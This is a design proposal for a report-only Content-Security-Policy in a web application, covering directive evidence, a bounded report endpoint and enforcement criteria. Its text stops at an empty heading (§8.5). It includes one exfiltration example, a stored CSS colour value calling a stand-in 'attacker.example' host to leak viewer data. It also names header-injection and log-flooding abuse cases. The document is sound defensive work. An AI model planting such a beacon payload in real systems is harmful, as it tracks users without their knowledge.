# Content-Security-Policy — the report-only half (HD-264)

**Status:** proposal / design review. **Date:** 2026-09-05. **Author:** systems-analyst.
**Scope of this document:** the **report-only** rollout only. Enforcement is a separate ticket, filed
after this one has produced evidence (§7). The split is the owner's, and §2.2 says why it cannot be
undone by good intentions.
**Related:** HD-176 (`docs/design/taxonomy-colour-contrast-proposal.md` — the live worked example this
policy generalises), HD-191 / HD-262 (`request_body max_size` at the edge and the `edge-body-limit`
drift scope — the precedent for "the Caddyfile is never synced"), HD-199
(`docs/design/config-delivery-proposal.md` — the never-sync rule itself), HD-233
(`DatabaseBusyRefusal` — the one response in the product written outside the security filter chain),
HD-221 (in flight on the drift script's `containers` check — §5.3 states what the drift check must
*know*, not how it reads today), ADR-0006 (one codebase, two modes), ADR-0019 (one refusal shape per
declared constraint).
**Touches:** `src/main/java/com/hamstrack/common/security/` (the header, the report endpoint),
`src/main/java/com/hamstrack/common/config/` (one `@ConfigurationProperties` class),
`src/main/java/com/hamstrack/common/exception/DatabaseBusyRefusal.java` (one map entry — §5.4),
`src/main/java/com/hamstrack/common/observability/ProductMetrics.java` (two counters),
`application.properties` + both profile files, `docker-compose.prod.yml`, `.env.prod.example`,
`docs/self-hosting.md`, `docs/observability.md`, `openapi.yaml` + `docs/api-*.md`, tests.
**No migration. No new table. No new column.** §9 says why that is a decision and not an omission.
**No frontend change in this ticket.** §11 names the two it uncovered and why one of them must *not*
ship first.

---

## 0. The recommendation, first

**Ship a report-only Content-Security-Policy from `SecurityConfig`, with a same-origin report sink that
is on in Cloud and off in DC, and treat the absence of reports as a broken pipeline until one known
violation has proved otherwise.**

Three decisions, resolved rather than presented:

1. **Where it lives: the application** (`SecurityConfig`), not the `Caddyfile`. The policy is a
   statement *about the JavaScript bundle*, the bundle ships inside the image, and the `Caddyfile` is
   one of the two paths a deploy never syncs — so a policy at the edge would be a claim about an
   artefact it cannot travel with, invisible to the repository, absent for every self-hoster who
   fronts the app with something else, and owed a new drift scope. §5.
2. **How reports are collected: one new endpoint in this application** — `POST /api/security/csp-report`,
   unauthenticated by necessity, bounded, budgeted, persisting nothing, answering `204` always. Not a
   third-party collector (no self-hosted path, and it would ship tenant hostnames off the box), and not
   "read the console during a staged rollout" (which measures only the pages the operator opens, in the
   one browser the operator uses — and the single violation this analysis can already *predict* is one
   that never appears on `localhost`). §6.
3. **The directive set is the one we intend to enforce, escape hatches deliberately omitted.** A
   report-only policy that already contains `'unsafe-inline'` measures nothing about whether
   `'unsafe-inline'` is needed. §4.

The single directive that closes HD-176's class outright is **`img-src 'self' data:`**. Everything else
in the policy is defence in depth that has to be *measured* before it is enforced, which is the whole
reason this ticket was split.

---

## 1. Problem and goal

### 1.1 The gap

Nothing in the stack sets a Content-Security-Policy. `Caddyfile` sets no response headers at all (it
declares `request_body max_size` and `reverse_proxy app:8080`, nothing else). `SecurityConfig` has no
`.headers(...)` block, so Spring Security's defaults apply — six headers, enumerated verbatim in
`DatabaseBusyRefusal.SECURITY_HEADERS` (`X-Content-Type-Options`, `X-Frame-Options`, `X-XSS-Protection`,
`Cache-Control`, `Pragma`, `Expires`) plus a conditional `Strict-Transport-Security` — and none of them
is a CSP.

### 1.2 Why that is worth a ticket, and not merely a checklist item

Because the class already fired, in this product, in a shape nobody would have designed:

> A custom-field select option carries a `color` inside a JSONB `config`. Until HD-176 that value was
> validated as nothing. The SPA paints it as a fill, and CSSOM accepts `url(...)` as a
> `background-image` — so a stored `color` of `url(https://attacker.example/b.png?ws=acme)` makes the
> browser of **every project member** who opens a board or an issue form fetch that URL: viewer IP,
> user agent and view timing, to a third party, with no script execution and nothing in the instance's
> logs.

HD-176 closed that hole twice — a `422` on the write door and `colour.ts`'s `fillOf` guard with a corpus
tripwire on every paint site — and deliberately did not clean rows written before it. Both fixes are
per-site and depend on somebody remembering. `img-src 'self' data:` closes the whole class, including
the sites nobody has written yet, and it is the only one of the three that does not.

**The class has a second live member, and it is already in the tree.** `users.avatar_url` is a column
with no length bound and no validation, read into `<img src={avatarUrl}>` (`components/ui.tsx`
`Avatar`) and carried by five DTOs (`MeResponse`, `WorkspaceMemberResponse`, `ProjectMemberResponse`,
`IssueResponse.AssigneeInfo`, `ComponentResponse`). A grep over `src/main/java` finds no `setAvatarUrl`
anywhere: the column has readers and no writer, so it is inert **today**, and the seeded demo backlog
already advertises "profile page with editable display name and avatar upload" as work to come. The day
that writing door ships, the exfiltration shape of §1.2 exists again in a different component, written
by somebody who was not on HD-176. That is what "defence in depth" means here concretely.

### 1.3 Goal

At the end of this ticket:

- every response the application serves carries a `Content-Security-Policy-Report-Only` header;
- violations from real sessions are collected somewhere an operator can count and group them;
- the collection pipeline has been **proved to work** by observing a violation this document predicts
  in advance — not by observing silence;
- the enforcement ticket opens with an inventory of what would break, per directive, per browser
  engine, rather than with a guess.

Nothing about the product's behaviour changes. Report-only cannot block anything. §8 covers what it can
still cost.

---

## 2. Scope

### 2.1 In scope

- One `Content-Security-Policy-Report-Only` header, written by the application, on every response of
  the main (`:8080`) filter chain.
- The directive set of §4, with the evidence for each directive read off the **built artefact**.
- One report-collection endpoint, its bounds, its budget, its logging and its two counters.
- Property + env-var wiring, per-profile defaults, and the documentation rows that go with them.
- The evidence bar the enforcement ticket must clear (§7).

### 2.2 Out of scope — and why the split holds

**Enforcement.** No `Content-Security-Policy` (enforcing) header is added by this ticket, in any mode,
behind any flag. The ticket's own acceptance criterion is *"the report-only period produced evidence,
and the enforcement decision cites it rather than a guess"*, and that cannot be satisfied in one
sitting by anybody: it needs the header deployed, real sessions across real surfaces, and time. A flag
that "just flips it on later" is how the evidence step gets skipped under release pressure, so the
enforcing header is not written by this ticket at all — the enforcement ticket adds one line and cites
§7.

Also out of scope:

- **Other security headers** (`Referrer-Policy`, `Permissions-Policy`, COOP/COEP). ADR-0035 settles
  *where* they will go when somebody wants them; this ticket adds only the CSP.
- **Subresource Integrity**, nonces, hashes, and any build-pipeline change. A nonce needs the document
  to be rendered per-request; `index.html` is a static file served by Spring's resource handler. If the
  measurement says `script-src 'self'` is insufficient, that is the enforcement ticket's problem and it
  will have data.
- **Fixing what the reports find.** Two findings are already known (§11) and both are separate tickets.
  One of them must deliberately *not* be fixed first — §4.4.
- **The `Caddyfile`.** It is not edited, not synced, and gains no new drift scope (§5.3).

### 2.3 Non-goals

- Blocking anything. A report-only policy has no enforcement semantics.
- Replacing HD-176's `422` or `fillOf`. Layers, not substitutes: a CSP protects browsers that support
  it and does nothing about what the database stores.
- Building a violation *dashboard*. Two counters and a log line are the whole surface; a Grafana panel
  is a ten-minute follow-up if the enforcement ticket wants one.

---

## 3. Actors and permissions

| Actor | What they do | Authorisation |
|---|---|---|
| Every browser loading any page | receives the header on every response | none — the header is unconditional on the chain |
| Every browser that violates the policy | `POST`s a report to the sink | **none — the endpoint is unauthenticated by necessity** (§6.2) |
| Operator (Cloud) | reads the counters and the log lines, decides enforcement | existing Grafana/Loki access (SSM-only, `docs/observability.md`) |
| Operator (DC) | flips `CSP_REPORT_ONLY_ENABLED` / `CSP_REPORT_SINK_ENABLED`; otherwise reads their own browser console | host access to `.env` |
| System `ADMIN`, workspace Owner, project MANAGER | **nothing** | this feature has no in-product UI, no role gate and no workspace scoping |

**Tenancy:** the sink is the only new door and it is **not workspace-scoped**, because it cannot be: a
CSP report is emitted by a browser, not by a session, and it carries no workspace identity that could be
trusted if it did. The consequence that matters is the one that keeps it safe: the endpoint **accepts
and returns nothing tenant-derived**. It takes a body, drops it into a log line with the query strings
stripped (§6.3), and answers `204` with an empty body — always, including for a body it rejected. There
is no read path, so there is nothing for the project's top bug class to leak. It can only ingest, which
is why every bound in §6.2 is about volume rather than about authorisation.

---

## 4. The directive set, and the evidence under each directive

### 4.1 The policy

```
default-src 'self'; base-uri 'none'; object-src 'none'; frame-ancestors 'none';
form-action 'self'; script-src 'self'; style-src 'self' https://fonts.googleapis.com;
font-src https://fonts.gstatic.com; img-src 'self' data:; connect-src 'self';
frame-src 'none'; worker-src 'none'; report-uri /api/security/csp-report
```

Emitted as one line. ≈316 characters as written (summed directive by directive from the list above);
with the header name `Content-Security-Policy-Report-Only: ` that is ≈352 bytes on the wire. When the
sink is disabled the `report-uri` clause is omitted and the string is ≈280 characters — see §8.2 for why
the clause is *conditional* rather than always present.

**The policy contains no deployment-specific value.** Every source is `'self'`, `'none'`, `data:` or one
of two absolute font origins. No hostname, no `SITE_ADDRESS`, no `APP_BASE_URL`. That property is what
makes a single version-controlled string correct for Cloud and for every self-hosted install at once,
and it removes the one real argument for setting the policy at the edge (where the deployment's own
address already lives).

### 4.2 Where each directive's evidence came from

Evidence was read off the **built artefact** — `src/main/resources/static/`, which the Vite build
regenerates on every frontend build (`outDir: '../resources/static'`, `emptyOutDir: true`) — and not
from the sources. The tree read for this document held `index.html`, `favicon.svg`, `openapi.yaml` and
**20 files under `assets/` (18 `.js`, 2 `.css`)**. Re-derive against the release artefact before
shipping; the *shape* of each finding below is stable, the chunk names are not.

| Directive | Value | Evidence |
|---|---|---|
| `default-src` | `'self'` | the floor. Everything below either narrows it or is the one exception the artefact forced. |
| `script-src` | `'self'` | `index.html` carries exactly one script — `<script type="module" crossorigin src="/assets/index-*.js">` — and **no inline `<script>`**. No CDN appears in any built chunk. |
| `style-src` | `'self' https://fonts.googleapis.com` | `index.html` line 21 is `<link rel="stylesheet" href="https://fonts.googleapis.com/css2?family=Inter…&family=IBM+Plex+Mono…&family=JetBrains+Mono…">`. Deliberately **without `'unsafe-inline'`** — §4.3. |
| `font-src` | `https://fonts.gstatic.com` | **`@font-face` appears zero times in the built CSS.** Every face in the product therefore comes from the remote Google sheet, which loads its files from `fonts.gstatic.com` (`index.html` preconnects to it). `'self'` is *not* listed because no font is served from this origin — if that ever changes, the report says so. |
| `img-src` | `'self' data:` | **Two independent producers of `data:`.** (a) `pages/reports/png.ts` rasterises a chart by assigning `img.src = "data:image/svg+xml;charset=utf-8,…"` (`svgDataUrl` → `loadImage`) — the PNG export of every report goes through it. (b) The Swagger UI stylesheet carries **four** `url(data:image/…)` background images (`assets/DocsPage-*.css`; CSS background images are governed by `img-src`). This is also **the directive that closes §1.2**: a stored `url(https://attacker.example/…)` painted as a background resolves against `img-src`, and neither `'self'` nor `data:` admits it. |
| `connect-src` | `'self'` | Every `fetch`/`EventSource` in the SPA targets `/api/**` on its own origin. Attachments are streamed **through the app** (`IssueController.downloadAttachment` returns an `InputStreamResource`); a grep for `presign`/`generatePresigned` over `src/main/java` finds nothing, so even the S3 backend never hands the browser a cross-origin URL. One known exception is deliberately excluded — §4.4. |
| `form-action` | `'self'` | Every `<form>` in the SPA is an `onSubmit` handler with no `action` attribute (10 of them, `CreateIssueModal`, `LoginPage`, `RegisterPage`, `ForgotPasswordPage`, `ResetPasswordPage`, …). The default action is the current document's URL. |
| `frame-src` / `worker-src` | `'none'` | No `<iframe>`, `<object>` or `<embed>` in the SPA sources; **`new Worker` and `importScripts` appear zero times** in the built chunks. Stated as `'none'` rather than omitted so the report fires the day a library brings one in. |
| `object-src` | `'none'` | Nothing loads a plugin document. Cheap, and the one directive `default-src` is famously not allowed to cover in older engines. |
| `base-uri` | `'none'` | `index.html` has no `<base>`. Blocking base-tag injection is the cheapest half of the "attacker controls where relative URLs resolve" class. |
| `frame-ancestors` | `'none'` | The app already refuses framing today, via Spring Security's default `X-Frame-Options: DENY` (verified as a live value in `DatabaseBusyRefusal.SECURITY_HEADERS`). This clause is therefore **redundant with an already-enforced control**, costs 24 characters, and is what carries the refusal forward on the day `X-Frame-Options` is dropped as obsolete. |

### 4.3 What is deliberately absent, and why each absence is the point

- **`'unsafe-inline'` in `style-src`.** A report-only policy that already carries the escape hatch
  measures nothing about whether the escape hatch is needed. The prediction, with its reason: React 19
  applies `style={{…}}` props through the CSSOM (`node.style.setProperty` — the built main chunk
  contains `setProperty(`), and CSSOM mutations are **not** subject to `style-src-attr`, so the
  product's several hundred inline `style` props should produce no reports at all. Two things could
  falsify that — a library that sets a literal `style` attribute, and React 19's `<style precedence>`
  resource path (the main chunk does contain `createElement("style")` inside React DOM's float
  machinery). **This is the highest-risk assumption in the document** (§8.5), and the correct response
  to a flood of style reports is not `style-src 'unsafe-inline'` but the narrower `style-src-attr
  'unsafe-inline'`, decided by the enforcement ticket with the counts in hand.
- **`'unsafe-eval'` in `script-src`.** One `new Function` exists in the artefact, in the Swagger UI
  chunk's webpack runtime: `if (typeof globalThis == "object") return globalThis; try { return this ||
  new Function("return this")() } catch { … }`. The guard returns before the call on every engine that
  has `globalThis`, so the construct is dead code in practice. `WebAssembly` appears once, as a
  `core-js` polyfill for its error types, not as an instantiation. Both are predictions; the reports
  settle them.
- **`https://validator.swagger.io`** — excluded on purpose. It is the canary (§4.4).
- **`report-to` / `Reporting-Endpoints`** — deferred to D3 (§14). Chrome ignores `report-uri` when a
  `report-to` is present, so a mis-wired `Reporting-Endpoints` header silently produces *zero* reports
  in the majority browser while the header looks perfect. Phase 1 ships the mechanism that cannot fail
  that way.

### 4.4 The canary — a violation this document predicts before deployment

`pages/docs/DocsPage.tsx` calls `SwaggerUIBundle({ url: '/openapi.yaml', … })` and does **not** pass
`validatorUrl`. The shipped bundle defaults it to `"https://validator.swagger.io/validator"`
(`validatorUrl:"https://validator.swagger.io/validator"` appears twice in `assets/DocsPage-*.js`), and
the badge renders when both the validator URL and the resolved spec URL pass a guard that rejects only
`localhost`/`127.0.0.1`/`"none"`:

```
…&&Mr(this.state.validatorUrl)&&Mr(this.state.url)? …createElement(f7,{src:`${a}?url=${encodeURIComponent(this.state.url)}`,alt:"Online validator badge"}):null
…function Mr(t){return!(!t||t.indexOf("localhost")>=0||t.indexOf("127.0.0.1")>=0||t==="none")}
```

So on any real hostname the documentation page loads an `<img>` from `validator.swagger.io` carrying
this instance's public spec URL, and **on a developer's `localhost` it does not**. Three things follow,
and they are the reason this section exists:

1. **`img-src 'self' data:` will report it.** That is a concrete, dated prediction, verifiable on the
   first day of the rollout.
2. **It is the proof that the pipeline works.** An empty report stream is indistinguishable from a
   broken sink, a dropped header or a `report-uri` nobody reaches — this project has already written
   down the same shape once, as *"`noDataState: OK` reads an absent series as health"*. Until the canary
   appears, "no violations" means "no evidence".
3. **It must therefore not be fixed first.** The one-line frontend fix (`validatorUrl: null`) is a
   separate ticket (§11) that ships **after** the canary has been observed — and then the canary
   disappearing proves the pipeline in the other direction too.

It is also, incidentally, a real finding: a self-hosted install's documentation page beacons its
hostname to a third party, and an air-gapped one renders a broken image.

---

## 5. Where the policy lives — the decision

### 5.1 The two candidates

|  | `Caddyfile` (edge) | `SecurityConfig` (app) |
|---|---|---|
| Reaches static assets and the SPA document | yes | **yes** — the repository `Caddyfile` is `reverse_proxy app:8080` with no `file_server`, so `index.html` and `/assets/**` are served by Spring's resource handler and pass through the security chain |
| Reaches responses the proxy generates itself | yes | no — §5.2 enumerates them |
| Version-controlled | **no, in effect** — the file exists in the repository but `ops/deploy/apply-config.sh` hard-refuses to sync it (the production copy carries a hand-added Cloudflare `trusted_proxies` block the repository's does not), so the box's copy and the repository's are two different files by design | yes |
| Reaches a self-hoster | only if they run the bundled Caddy *and* perform a hand merge | **always** — including behind nginx, Traefik, a cloud load balancer, or no proxy at all |
| Travels with the artefact it describes | no — `APP_IMAGE_TAG` pins the image; nothing pins the Caddyfile beside it | **yes** — same image, same tag, same rollback |
| Testable | by a shell assertion on a file's text | **by MockMvc, in the suite that already asserts this product's header block** |
| Cost of adopting | a new drift scope, a documented hand-merge step, a release note | one `.headers(...)` block and one map entry (§5.4) |

### 5.2 The decision

**`SecurityConfig`.** The argument that decides it is not "version-controlled" (true but weak — the
`edge-body-limit` scope exists precisely to make an unsynced file's contents observable) but this:

> **A CSP is a statement about the JavaScript bundle, and the bundle ships inside the image.** A new
> chunk that loads a web worker, a library that starts using `blob:`, a font moved to self-hosting —
> each changes what the correct policy is, and each arrives in the image. Setting the policy at the
> edge puts the claim and the thing it describes in two artefacts with two lifecycles, one of which a
> deploy is forbidden to touch. The `edge-body-limit` scope exists because exactly that happened to a
> control the repository gained and production did not.

The `request_body max_size` block is at the edge for the opposite and equally good reason: it must
refuse bytes **before** the app spends a socket read and a temp-file write on them, which only the proxy
can do. There is no such argument here — a header costs the app nothing to emit and the browser is the
only enforcer either way. The two controls are not the same shape and the precedent does not carry.

**What the app does not cover, enumerated so nobody has to guess:**

1. Caddy's `413` from `request_body max_size` (HD-191) — generated at the edge, never reaches the app.
2. `502`/`504` while the app is down or restarting.
3. Caddy's TLS/ACME and HTTP→HTTPS redirect responses.
4. Caddy's own malformed-request refusals.

None of the four is an HTML document that can execute script (Caddy's default error bodies are plain
text with no markup and no scripting), so the residual risk of the gap is nil. It is stated here rather
than discovered later.

Two further exclusions inside the app, both deliberate: the **management chain** (`:9090`,
`managementFilterChain`) gets no CSP — the port is never published or proxied, and nothing on it is a
document; and no `<meta http-equiv>` fallback is added to `index.html`, because `frame-ancestors` and
`report-uri` are both ignored in a meta-delivered policy, which would make the fallback quietly weaker
than the header it duplicates.

### 5.3 What the drift check must know: **nothing new**

This is a saving, and it should be stated as one. Choosing the app means:

- no new `hamstrack_config_drift{scope=…}` value. That label is a closed enum and every addition is one
  more series per box for ever; the four that exist are `files`, `containers`, `installed-ops`,
  `edge-body-limit`.
- no hand-merge step in `docs/ops-prod-hardening.md`, no release note telling operators to edit a file
  the deploy will not touch, and no window in which production's policy and the repository's disagree.
- nothing that collides with HD-221's in-flight change to the `containers` check.

The property a future reader should test this against is a category, not a list: **a control the
repository can ship inside the image does not belong in the one file a deploy is forbidden to sync.**
`edge-body-limit` is drift-checked because its control *cannot* live anywhere else; a CSP can.

### 5.4 The one place inside the application that needs a hand copy

`DatabaseBusyRefusal.write` composes a `503` **outside** the security filter chain: `HeaderWriterFilter`
writes its block in a `finally`, and `DatabaseBusyFilter` then calls `response.reset()`, which takes it
off again — so the class re-sets six headers by hand (`SECURITY_HEADERS`) plus a conditional HSTS.

Adding a CSP to `SecurityConfig` therefore makes that response the **single** response in the product
without one, unless `SECURITY_HEADERS` gains a seventh entry in the same commit. Two consequences:

- The header must be **unconditional** (unlike HSTS, which is gated on `request.isSecure()`), so it is a
  plain map entry.
- **The omission is already sealed.** `DatabaseBusyRefusalTest.theFiltersRefusalCarriesEverySecurity
  HeaderTheAdvicesDoes` compares the filter's response against *whatever the advice carries*, not
  against a written list — so it turns red the moment the advice gains a header the filter does not.
  That is a pre-existing guard doing its job on a change written a release later, and the acceptance
  criteria in §13 use it rather than adding a new test for the same property.

---

## 6. How reports are collected

### 6.1 The choice, and the three it is chosen over

**A single endpoint in this application, off by default on DC.**

| Option | Cost | Verdict |
|---|---|---|
| **A third-party collector** (report-uri.com, Sentry) | no self-hosted path (ADR-0006), ships every violating URL — which in this product carries workspace and project ids in the path — to somebody else's database, adds a paid external dependency to a security control, and a DC operator behind a firewall gets nothing | **rejected** |
| **Nothing — evidence from browser consoles during a staged rollout** | sees only the pages the operator opens, in the browser the operator uses; §4.4's violation is invisible on `localhost` by construction, and Safari/Firefox/Chrome differ in what they report; it also produces no number anybody can cite | **rejected as the primary**, adopted as the **DC default** (§6.6) |
| **A new endpoint that persists reports in Postgres** | an unauthenticated door that writes rows is a disk-fill vector; the enforcement decision needs aggregates over days, which Loki's existing retention already provides | **rejected** — §9 |
| **A new endpoint that logs and counts** | one unauthenticated door, bounded and budgeted; reuses Loki + Prometheus, which are built, running and verified on production | **chosen** |

### 6.2 The endpoint contract

```
POST /api/security/csp-report
```

- **Authentication:** none. Added to the `permitAll` list in `SecurityConfig` beside `/api/meta` (the
  path is under `/api/**`, which is otherwise `authenticated()`). A browser sends a violation report
  with no credentials, so requiring any is requiring a report nobody can send.
- **Method:** `POST` only. Anything else → `405`.
- **Content-Type:** `application/csp-report` or `application/json`. Anything else → `415`. (If D3 adds
  the Reporting API, `application/reports+json` joins the list — the handler is written to accept a
  single report object *and* an array from day one, so D3 becomes a header change and not a rewrite.)
- **Body bound: 16 KB.** Derivation: a report body is a flat object of ~10 members whose only large
  values are three URLs; browsers cap `script-sample` at 40 characters, and a URL that survives Tomcat's
  own header/URI limits is ≲2 KB, so a single report is ≲8 KB with generous slack — doubled to admit a
  small Reporting-API batch. Over the bound → `413`, refused **without reading the body**.
- **Response: `204`, empty, always** — including for a refusal that logged nothing. There is no
  information a report sender is entitled to, and a discriminating response is a free oracle about the
  instance's state. (The `4xx` codes above are the servlet-level refusals that happen before the
  handler; they carry no body either.)
- **Budget: 60 reports/minute/IP, and 600/minute for the instance.** Derivations: a worst case document
  in which *every* subresource is refused produces at most **22** reports (20 built asset files + 2
  external font origins), so 60/min leaves ~3× headroom over a client hard-navigating twice a minute
  while bounding an anonymous sender to 60 log lines a minute; the instance cap is 10× that, on the
  reasoning that a sink which is hearing from ten simultaneously-violating clients has already told the
  operator everything it can and must not become the instance's log budget. Over budget → `429` with
  `Retry-After`, and a `budget` increment on the drop counter.
- **Its own budget, not a shared one.** It is charged neither to `app.rate-limit.auth-ip-requests-per-
  minute` (a report flood must never be able to lock a user out of `/login` — the auth budget is
  per-IP and shared IPs are ordinary) nor to the write budget or the expensive-read share (this handler
  touches no database and takes no connection). *A throttle is earned by the work a handler does*, and
  this handler's work is one log line and one counter increment; what it earns is a bound on volume,
  which is its own.
- **Work performed:** parse, filter (§6.5), log, increment. **No repository call, no transaction, no
  `FileStorage` call, no mail.**

### 6.3 What is logged, and what is stripped

One line per accepted report, at `INFO`, through the existing structured-logging pipeline (`logging.
structured.format.console=logstash` on both deployed profiles), with these fields:

| Field | Source | Rule |
|---|---|---|
| `csp.directive` | `effective-directive` (falling back to `violated-directive`) | mapped through the closed set of directives we ship; anything else logged as `other` |
| `csp.blocked` | `blocked-uri` | scheme + host + path only. **Query and fragment stripped.** Keywords (`inline`, `eval`, `data`) pass through as-is |
| `csp.document` | `document-uri` | **path only** — query and fragment stripped |
| `csp.line` | `line-number`, `source-file` | source file path only, no query |
| `csp.sample` | `script-sample` | truncated to 40 characters (the browsers' own cap; restated so a non-conforming sender cannot widen it) |
| `csp.ua` | `User-Agent` | truncated to 120 characters — the enforcement decision has to be readable per engine, and Safari has no Reporting API |

**Why the stripping is not optional.** A `document-uri` in this product can be a search URL carrying an
HQL query — i.e. the text of somebody's issue titles — and the same field can carry the workspace and
project ids in its path. Log lines travel to Loki and are read by operators. The project's own rule for
its ops scripts is *log names and counts, never contents*; this is the same rule applied to a value a
browser hands us. Path-only keeps the field diagnostic (which page) without making the log a copy of
what the user typed.

> **What shipped differs from this table, and the table is left as proposed.** A design document is the
> record of what was decided; rewriting it to match the code deletes that record. But a table describing
> *shipped fields* is read as documentation of them, so the differences are listed here rather than
> patched in above. Authoritative descriptions: `CspReportSink`'s javadoc and `docs/project-state.md`.
>
> - **`csp.document` is not "path only — query and fragment stripped".** It is the **route pattern** the
>   path matches: every UUID-shaped segment becomes `{id}` and every all-digit segment `{n}`, so a page
>   URL logs as `/w/{id}/p/{id}/issues/{n}`. The argument in the paragraph above — "path-only keeps the
>   field diagnostic" — turned out to be the argument *for* patterning rather than against it: the
>   endpoint is unauthenticated, so a retained id is one the caller *typed*, and anybody who knows a
>   workspace UUID could mint INFO lines attributed to that tenant. Which page is the pattern, not the
>   instance.
> - **`csp.line` is a line number and nothing else** — a short run of digits, or the field is absent. It
>   is not "source-file path only, no query".
> - **`csp.source` is a field in its own right**, absent from this table: the source file as
>   `scheme://host[:port]` plus the patterned path. The scheme is load-bearing, because
>   `chrome-extension://…/content.js` reduced to `/content.js` is indistinguishable from our own bundle,
>   and extension injection is both the dominant noise source and the main confounder of the `style-src`
>   count this design proposes to settle by counting.
> - **`csp.blocked` keeps scheme, host and port and patterns its path** for the same reason
>   `csp.document` is patterned: the foreign-document filter compares `document-uri` alone, so this
>   field is not same-origin by construction.
> - **Every truncation is counted in UTF-8 bytes, not characters**, and control characters are stripped
>   at the write site. One accepted report is at most ~700 bytes of field values. So the two rows above
>   that state a *character* count are wrong in their unit: `csp.sample` is 40 **bytes** and `csp.ua` is
>   120 **bytes**. The parenthesis on the `csp.sample` row is wrong with them — 40 is indeed the
>   browsers' own cap, but theirs is in characters, so a non-ASCII sample is cut *shorter* here than a
>   browser would cut it. That is the deliberate half of the trade: this bound is a log-volume bound and
>   a budget denominated in a unit other than the one the disk uses is not a budget, which is this
>   project's own BCrypt lesson (a char-counted bound against a byte-counted store). The field carries
>   source code rather than prose and its job is discrimination rather than reproduction, so 40 bytes
>   stays; 64 is available as insurance if CJK or emoji samples ever need to survive at their natural
>   length, and it is one constant. `CspReportSink`'s javadoc is authoritative on all of this.
> - **The per-minute budgets are counted in log lines, not requests** — one request may carry a batch,
>   so a token is spent per line written.

### 6.4 The metrics

Two counters in `ProductMetrics`, which is the single home for custom meters and carries the
non-negotiable rule that no label is ever unbounded or tenant-identifying:

- `hamstrack.csp.violations{directive}` — `directive` drawn from a **closed enum of the twelve
  directives this policy ships, plus `other`**. This is the one place cardinality could have exploded:
  `effective-directive` is *attacker-supplied text*, and passing it through would let one `curl` loop
  create unbounded Prometheus series. The mapping is the guard.
- `hamstrack.csp.reports_dropped{reason}` — `reason` ∈ `foreign_document | too_large | unparseable |
  budget`. A sink that silently discards is a sink whose silence cannot be read.

Both get a row in `docs/observability.md`'s metric table. No alert rule is proposed, and that absence is
written down rather than left to be discovered — the same convention `report_requests` and
`search_requests` already follow.

### 6.5 The foreign-document filter

Any report whose `document-uri` host is not this instance's own (compared against `app.base-url`) is
**dropped before logging**, counted as `foreign_document`, and still answered `204`.

The abuse it closes is specific and cheap to mount: an unauthenticated report endpoint is a public log
sink, and anybody can point *their* site's `report-uri` at ours and have every one of their visitors
fill our journal with reports about a page we do not serve. The filter is one string comparison and it
also happens to bound what can reach the log to URLs from our own origin — which is what makes §6.3's
stripping rules sufficient rather than best-effort.

### 6.6 DC: the sink is off, and that is a complete answer

On DC the sink defaults to **off**, the `report-uri` clause is therefore absent from the header (§8.2),
and a self-hoster who wants evidence gets it from their browser console — which for a single-instance
install with a handful of users is a genuinely adequate instrument, and is the same thing they would
read anyway. An operator who wants collection sets one variable. Two reasons the default is off rather
than on:

1. It is an unauthenticated public endpoint. A self-hoster who never asked for one should not be given
   one by an upgrade.
2. The per-IP budget needs a real client IP, and `RATE_LIMIT_TRUST_FORWARDED_FOR` defaults to `false`
   on DC (correctly — the app port may be directly reachable). Behind a proxy that would make every
   report arrive from one address, so the per-IP bound would degrade to the instance bound. Turning the
   sink on is therefore paired in the documentation with the forwarded-for setting, in the one place a
   DC operator reads (`docs/self-hosting.md`).

---

## 7. What "evidence" means — the bar the enforcement ticket must clear

The enforcement ticket may cite this section and nothing weaker.

**E1 — the pipeline is proved live, not assumed.** The §4.4 canary (`img-src`, `blocked-uri` host
`validator.swagger.io`) has been observed at least once in the collected reports. Until it has, every
other number in this section is void, because zero reports and a broken sink are the same observation.

**E2 — the window.** ≥ **14 consecutive days** with the header present on 100 % of application
responses in Cloud. Derivation of the number: it must span at least two working weeks so that
weekly-cadence surfaces (sprint start, sprint review, the reports pages people open on a Monday) appear
at least twice, and it must be long enough that a single unusual day cannot dominate the inventory.

**E3 — surface coverage, executed rather than hoped for.** Passive traffic covers what users happen to
do; the following are walked deliberately, once per engine, and the walk is recorded on the ticket:
login · registration · password reset · landing page · Home · Board · Backlog · issue drawer · issue
full page · create-issue modal · search results · saved filters · each report page **including a PNG
export and a CSV export** · Insights · admin console (statuses, priorities, issue types, workflows,
fields, users) · workspace and project settings · account page · invite accept · **the docs page**.
**Three engines — Chromium, Firefox, WebKit** — because directive support, report field names and
report *delivery* all differ between them, and a policy validated on one is a policy validated for
some of the users.

**E4 — the inventory.** Reports grouped by `(effective-directive, blocked-uri host)`, each group
carrying a decision: *fix the source*, *widen the directive*, or *accept and document*. Enforcement
ships when every group has one and no group is undecided. A group that is "probably fine" is not a
decision.

**E5 — the style question is answered with a number.** Specifically: how many `style-src` reports, and
of those, how many are `style-src-attr`-shaped (an inline `style` attribute) versus a `<style>` element.
That number decides between `style-src 'self'`, `style-src-attr 'unsafe-inline'` and `style-src
'unsafe-inline'`, and it is the one question this analysis could not settle from the artefact (§4.3).

**E6 — the two counters exist, are scraped, and are in `docs/observability.md`'s table.** An evidence
mechanism nobody documented is one nobody will find in three months.

---

## 8. Edge cases and failure modes — what a *report-only* policy can still cost

It cannot block. It can still do all of the following, and each has an answer.

### 8.1 A malformed header

A syntactically broken policy is ignored by browsers directive-by-directive; a wholly malformed one is
ignored entirely. The real hazard is not breakage but **header injection**: the policy string is
operator-overridable (§12), and a value containing CR/LF would let an operator's typo split the
response. **Answer:** the override property is validated at binding time with `@Validated` on the
`@ConfigurationProperties` class (which is exactly where `@Validated` belongs in this codebase —
ADR-0018 forbids it on web beans, not on config beans): a bounded length and a character class that
admits no control characters, so a bad value **fails startup** instead of shipping.

### 8.2 A `report-uri` that 404s

Named in the ticket, and closed **by construction rather than by care**: the `report-uri` clause is
emitted **if and only if** the sink is enabled. There is no configuration in which the header names an
endpoint the instance does not serve. (Had it been unconditional, every violation on a DC box would
`POST` to a path that `/api/**` answers `401` on — an unauthenticated request storm generated by our own
header.)

### 8.3 Report volume

Bounded three ways: the per-IP budget, the instance budget, and the fact that nothing is persisted. The
worst realistic case — a directive that turns out to be violated on every page load — costs at most 22
reports per document (§6.2) and is then clamped. If the volume is high, that is itself the finding, and
the counter says so without the log having to hold it.

### 8.4 The header on every response

≈352 bytes per response. On HTTP/2 — which is what Caddy serves — an identical header repeated on a
connection is compressed to a dynamic-table index of a few bytes after the first response, so the cost
of a 40-request page load is ≈352 bytes plus noise, not 14 KB. Stated because the objection is
reasonable and the answer is not obvious.

### 8.5 The highest-risk assumption

